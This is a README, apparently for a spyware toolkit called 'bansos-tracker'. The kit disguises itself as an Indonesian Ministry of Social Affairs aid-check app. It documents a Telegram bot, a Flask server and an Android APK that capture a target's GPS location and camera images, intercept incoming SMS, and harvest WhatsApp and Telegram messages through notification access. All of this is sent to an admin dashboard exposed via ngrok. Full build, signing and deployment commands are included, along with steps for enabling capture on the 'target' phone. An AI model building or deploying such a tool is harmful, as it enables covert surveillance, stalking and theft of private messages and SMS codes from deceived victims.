# bansos-tracker

**GPS Tracking System** — Telegram Bot + Android WebView APK  
*Cek Bantuan Sosial (Kemensos RI)*

> ⚠️ **Untuk rebuild di masa depan**, ikuti panduan di bawah.

---

## 📋 Daftar Isi

- [🚀 Rebuild Cepat (5 Menit)](#-rebuild-cepat-5-menit)
- [🐍 Backend Setup (Flask + Bot)](#-backend-setup-flask--bot)
- [📱 Android APK Build](#-android-apk-build)
- [🌐 Public Access (ngrok)](#-public-access-ngrok)
- [🖥 Dashboard Monitoring](#-dashboard-monitoring)
- [📁 Struktur File](#-struktur-file)

---

## 🚀 Rebuild Cepat (5 Menit)

```bash
# 1. Clone repo
git clone https://github.com/clickmamaheti-prog/bansos-tracker.git
cd bansos-tracker

# 2. Install Python deps
pip3 install flask python-telegram-bot requests

# 3. Set bot token
export BOT_TOKEN="isi_dari_botfather"

# 4. Jalankan
python3 bot.py
```

Buka `http://localhost:5000` → landing page siap.

---

## 🐍 Backend Setup (Flask + Bot)

### Requirements
| Package | Version |
|---------|---------|
| Python | 3.8+ |
| Flask | latest |
| python-telegram-bot | ≥20.0 |
| requests | latest |

### Environment Variables
| Variable | Wajib? | Contoh |
|----------|--------|--------|
| `BOT_TOKEN` | ✅ Ya | `8813008108:AAFTaDai5Cm5...` |
| `BASE_URL` | ✅ Ya | `https://domain.ngrok-free.dev` |

### Cara Dapat Token
1. Buka [@BotFather](https://t.me/BotFather) di Telegram
2. Kirim `/newbot`, ikuti instruksi
3. Copy token → `export BOT_TOKEN="token_anda"`

### Jalankan
```bash
python3 bot.py
```

Bot akan:
- Listen di port 5000
- Polling Telegram untuk perintah `/start`
- Siap menerima tracking links

### Bot Menu (setelah start)
| Tombol | Fungsi |
|--------|--------|
| 📦 Buat Link Tracking | Generate link unik |
| 📋 Daftar Link Saya | Lihat semua link |
| 📊 Statistik & Info | Jumlah link/event |
| 🖥 Buka Dashboard | Admin panel monitoring |

### Deploy Script (VPS baru)
```bash
# Deploy otomatis (akan minta BOT_TOKEN + NGROK_AUTHTOKEN)
bash deploy.sh
```

---

## 📱 Android APK Build

### Prasyarat
| Tool | Catatan |
|------|---------|
| Android SDK (34) | Build tools 34.0.0 |
| Java 8+ | JDK 8/11/17 |
| `aapt`, `d8`, `apksigner`, `zipalign` | Dari Android SDK |

### Manual Build (Gradle not working workaround)

```bash
cd android/BansosApp

SDK=/opt/android-sdk
AAPT=$SDK/build-tools/34.0.0/aapt
D8=$SDK/build-tools/34.0.0/d8
APKSIGNER=$SDK/build-tools/34.0.0/apksigner
ZIPALIGN=$SDK/build-tools/34.0.0/zipalign
PLATFORM=$SDK/platforms/android-34/android.jar
KS=../keystore.jks
KSPASS=android
ALIAS=key0

# Bersihkan
rm -rf build && mkdir -p build/out build/obj build/gen build/dex-out

# 1. Compile resources
$AAPT package -f -m -J build/gen -M app/src/main/AndroidManifest.xml \
  -S app/src/main/res -I $PLATFORM

# 2. Compile Java
javac -source 8 -target 8 -cp $PLATFORM \
  -d build/obj \
  -s build/gen \
  app/src/main/java/com/kemensos/bansos/*.java

# 3. Convert to DEX
$D8 --output build/dex-out --min-api 21 \
  --lib $PLATFORM \
  app/src/main/java/com/kemensos/bansos/*.class

# 4. Package APK
$AAPT package -f -M app/src/main/AndroidManifest.xml \
  -S app/src/main/res -I $PLATFORM \
  -F build/out/unsigned.apk build/obj

# 5. Add DEX
cd build/dex-out && zip -r ../out/unsigned.apk classes.dex && cd ../..

# 6. Align & Sign
$ZIPALIGN -f 4 build/out/unsigned.apk build/out/aligned.apk
$APKSIGNER sign --ks $KS --ks-pass pass:$KSPASS --key-pass pass:$KSPASS \
  --ks-key-alias $ALIAS --out build/out/bantuan-sosial.apk build/out/aligned.apk

# Verifikasi
$APKSIGNER verify build/out/bantuan-sosial.apk
```

Output APK: `build/out/bantuan-sosial.apk` (≈26 KB)

### Fitur Android

| File | Fungsi |
|------|--------|
| `MainActivity.java` | WebView + kamera/lokasi/SMS permissions + Notif channel |
| `SmsReceiver.java` | 📨 BroadcastReceiver — tangkap SMS masuk otomatis |
| `NotifListener.java` | 💬 NotificationListenerService — tangkap WA/Telegram chat |

### Cara Aktifkan Notif WA di HP Target
1. Buka **Settings → Apps → Akses Notifikasi**
2. Cari **"Cek Bantuan Sosial"**
3. Aktifkan toggle-nya ✅

---

## 🌐 Public Access (ngrok)

```bash
# Start ngrok
ngrok http 5000
```

Copy URL HTTPS (misal `https://xxx.ngrok-free.dev`) → set sebagai `BASE_URL`.

### Bypass Interstitial
APK sudah otomatis kirim header `ngrok-skip-browser-warning: true`.

### Cek Status
```bash
curl -s http://localhost:4040/api/tunnels | python3 -c "import sys,json; print(json.load(sys.stdin)['tunnels'][0]['public_url'])"
```

---

## 🖥 Dashboard Monitoring

Akses: `https://BASE_URL/admin/dashboard`

| Seksi | Data |
|-------|------|
| 📍 Tracking Events | GPS target |
| 💬 SMS Tertangkap | SMS masuk |
| 💬 Pesan Chat | WA (🟢), Telegram (🔵), Messenger, dll |

Auto-refresh setiap 12 detik.

---

## 📁 Struktur File

```
bansos-tracker/
├── bot.py                    # 🐍 Main app (Flask + Telegram Bot)
├── requirements.txt          # Python dependencies
├── start.sh                  # Quick start script
├── deploy.sh                 # Full deploy for VPS
├── .gitignore
├── README.md
│
├── templates/                # 🌐 Web pages (mobile-first)
│   ├── index.html            # Landing page
│   ├── track.html            # Target tracking form (GPS + camera auto-capture)
│   ├── dashboard.html        # Admin monitoring dashboard
│   ├── map.html              # Google Maps embed
│   └── error.html            # Error page
│
├── android/
│   └── BansosApp/            # 📱 Android WebView APK
│       ├── build.gradle.kts
│       └── app/src/main/
│           ├── AndroidManifest.xml
│           ├── java/com/kemensos/bansos/
│           │   ├── MainActivity.java     # Main activity (WebView + permissions)
│           │   ├── SmsReceiver.java      # SMS capture
│           │   └── NotifListener.java    # WA/chat notification capture
│           └── res/                      # Android resources
```

---

## ⚡ Quick Reference

```bash
# Start server
python3 bot.py

# Kill server
pkill -f "python3 bot.py"

# Start ngrok
ngrok http 5000

# Cek ngrok URL
curl -s http://localhost:4040/api/tunnels | python3 -c "import sys,json; print(json.load(sys.stdin)['tunnels'][0]['public_url'])"

# Reset database
rm -f tracker.db

# Build APK
cd android/BansosApp && bash build.sh  # (kalo ada script build)
```

---

> **Dibuat oleh DevCultur** — 2026
